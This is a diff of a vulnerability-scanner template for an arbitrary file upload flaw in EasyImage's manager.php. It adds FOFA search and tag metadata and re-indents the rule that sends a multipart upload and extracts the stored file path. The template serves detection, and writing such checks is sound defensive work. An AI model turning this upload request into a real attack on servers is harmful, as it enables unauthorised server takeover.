@@ -7,7 +7,9 @@ info:
   verified: false
   description: |
     EasyImage manager.php 存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件到服务器获取服务器权限
-    app="EasyImage-简单图床"
+    fofa: app="EasyImage-简单图床"
+  tags: easyimage,fileupload
+  created: 2024/01/16
 
 set:
   randstr: randomLowercase(6)
@@ -61,10 +63,10 @@ rules:
         {{randbody}}\r\n\
         \r\n\
         ------WebKitFormBoundary{{rboundary}}--"
-      expression: response.status == 200
-      output:
-        search: '"\"fullPath\":\"(?P<filename>.+?)\"".bsubmatch(response.body)'
-        filename: search["filename"]
+    expression: response.status == 200
+    output:
+      search: '"\"fullPath\":\"(?P<filename>.+?)\"".bsubmatch(response.body)'
+      filename: search["filename"]
   r1:
     request:
       method: GET
